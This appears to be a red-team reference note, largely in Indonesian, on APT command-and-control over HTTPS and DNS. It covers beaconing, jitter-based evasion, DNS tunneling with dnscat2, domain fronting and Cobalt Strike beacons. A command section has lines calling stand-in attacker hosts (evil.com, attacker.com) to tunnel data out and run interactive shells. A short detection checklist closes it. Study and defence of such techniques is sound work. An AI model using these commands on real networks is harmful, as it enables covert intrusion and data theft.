---
title: Attack Perspective — APT C2 & DNS (Red Team)
tags:
- attack
- red-team
- c2
- dns
- tunnel
- domain-fronting
- beacon
- apt
created: 2026-08-14
updated: 2026-08-14
status: complete
cssclasses:
  - wide-table
  
---

# APT C2 & DNS — Perspektif Penyerang

> C2 = backbone operasi. DNS = channel tersembunyi terbaik (port 53 selalu terbuka). Red team: beaconing, DNS tunneling, domain fronting, redirector chain, traffic shaping.

## 1. C2 Architecture

| Komponen | Fungsi | Red Team Implementasi | Evasion | Detection Gap |
|----------|--------|----------------------|---------|----------------|
| **Beacon** | Periodic callback ke C2 | Cobalt Strike, Havoc, Sliver | Jitter + traffic shaping | Beaconing detect = threshold gap |
| **Redirector** | Proxy between target → C2 | Nginx/Apache redirector, CDN front | Redirector = legit web server | Redirector detect = rare |
| **Domain Fronting** | Hide C2 domain behind CDN | SNI = CDN domain, Host = C2 | CDN edge = legit traffic | NGFW SSL inspect = partial |
| **DNS Tunnel** | Data exfil via DNS query | dnscat2, iodine, dnstt | High entropy = mimic CDN | DNS entropy detect = threshold |
| **Cloud API C2** | C2 via cloud service | GitHub commit, Telegram bot, S3 | Cloud API = legit service | Cloud API detect = rare |
| **Malleable Profile** | Custom C2 traffic pattern | Custom UA, JA3, cookie, body | Mimic browser | JA3 detect = signature gap |

## 2. Beaconing Chain

```
Implant: Target compromise → beacon payload → C2 server
    ↓
Callback: Beacon → C2 (HTTPS, port 443)
  ├── Interval: default 60s → jitter 30-300s
  ├── JA3: Chrome 120 fingerprint (Malleable)
  ├── UA: Chrome/120.0.0.0
  └→ Body: legitimate-looking HTML/JSON
    ↓
Traffic Shaping:
  ├── Jitter: random delay → break interval pattern
  ├── Bandwidth: max 100KB/s → below threshold
  ├── Business hours: 9-17 target timezone
  └→ Session: short burst 5-10s → close
    ↓
Command: Task via HTTPS → execute → exfil via HTTPS
    ↓
Persistence: Reconnect on reboot → new callback
```

## 3. DNS Tunneling Chain

```
Setup: Attacker DNS server (ns1.attacker.com)
    ↓
Client: dnscat2 client → encode data → subdomain query
  ├── [base32 payload].c2.attacker.com → A query
  ├── Server: decode → command → response TXT record
  └→ Bidirectional channel over DNS
    ↓
Use Case:
  ├── C2 (interactive shell over DNS)
  ├── Exfil (data chunk → DNS query)
  └→ Pivot (DNS tunnel → internal network)
    ↓
Evasion:
  ├── High entropy → looks random (mimic CDN/telemetry)
  ├── Slow rate (1 query/30s) → below threshold
  └→ Use legit DNS resolver → no direct connection
    ↓
Detection Gap: DNS entropy analysis → but legit services also high entropy
```

## 4. Domain Fronting

```
Architecture:
  ├── C2 domain: c2.attacker.com → points to CDN (Cloudflare/Azure)
  ├── Target → connect: SNI = legit.cdn.com (CDN domain)
  ├── Host header = c2.attacker.com (C2 domain)
  └→ CDN edge → forward ke C2 → response = CDN IP
    ↓
Result:
  ├── Firewall sees: connection ke Cloudflare IP (legit)
  ├── NGFW SSL inspect: SNI = legit CDN domain
  ├── DNS: only legit CDN resolution
  └→ C2 domain = hidden behind CDN
    ↓
Bypass: CDN blocking (2024+) → alternative: custom redirector chain
```

## 5. Tool Stack

| Tool | Use |
|------|-----|
| **Cobalt Strike** | C2 framework (Malleable profile) |
| **Havoc** | Open-source C2 |
| **Sliver** | Go-based C2 (cross-platform) |
| **dnscat2** | DNS tunnel C2 |
| **iodine** | IP-over-DNS tunnel |
| **Chisel / ligolo-ng** | TCP tunnel pivot |
| **Nginx** | Redirector (proxy C2) |

## 6. Referensi
- Cobalt Strike — https://www.cobaltstrike.com/
- Sliver — https://github.com/BishopFox/sliver
- dnscat2 — https://github.com/iagox86/dnscat2
- RITA (beaconing detect) — https://github.com/activecm/rita
- Malleable C2 — https://www.cobaltstrike.com/help-malleable-c2

## Konkret — C2/DNS Payload (Testable)

### DNS Tunneling (dnscat2)

```bash
# Attacker: jalankan dnscat2 server
ruby dnscat2.rb --dns port=53,domain=evil.com
# Target: dnscat2 client
dnscat2 --dns server=evil.com,port=53 evil.com

# Data eksfil via DNS query TXT record
# Setiap query: <data>.evil.com → server decode base64

# Deteksi Band: traffic DNS sangat besar (normal <1MB/hari)
# Tools deteksi: Yates, DNSicient
```

### Domain Fronting (CDN Abuse)

```bash
# Domain fronting: TLS SNI = domain legitimate
# HTTP Host header = domain attacker (ALSANYA sebagai SNI)
# CDN (CloudFront/Fastly) route berdasarkan Host header

# Contoh:
curl https://legit.cloudflare.com -H "Host: evil.com"
# CDN terdepan SNI legit → route internal ke evil.com

# Cobalt Strike C2 config:
# set HostName "evil.com"
# set HostHeader "legit.cloudflare.com"
# Hasil: traffic terlihat legit, evades NIDS
```

### Cobalt Strike Beacon (HTTP/S)

```bash
# 1. Start teamserver
teamserver C2_IP password

# 2. Create beacon (HTTP/S)
beacon http https://evil.com
# Malleable C2 profile → customisasi HTTP pattern

# 3. Generate payload
Attacks > Packages > Windows Executable (Stageless)
# Output: shellcode.bin / beacon.exe

# 4. Malleable C2 profile (WAF evasion)
# Mimic legitimate traffic (jQuery, Amazon API, dll.)
```

### DNS Beacon (Cobalt Strike)

```bash
# Configure DNS beacon
beacon dns 53 evil.com
# Beacon type: A record (data via A query), TXT, AAAA

# Data exfil via subdomain:
# <base64-data>.A.evil.com → server decode
```

### Detection Checklist

1. DNS query volume: spike ke 1 domain = tunnel
2. DNS query length: >100 char = base64 data
3. TXT record count biasanya 0 — jika banyak, ada tunneling
4. Jitter: beacon interval statis = C2, human = random
5. TLS SNI vs Host header mismatch = domain fronting
---

audited
---
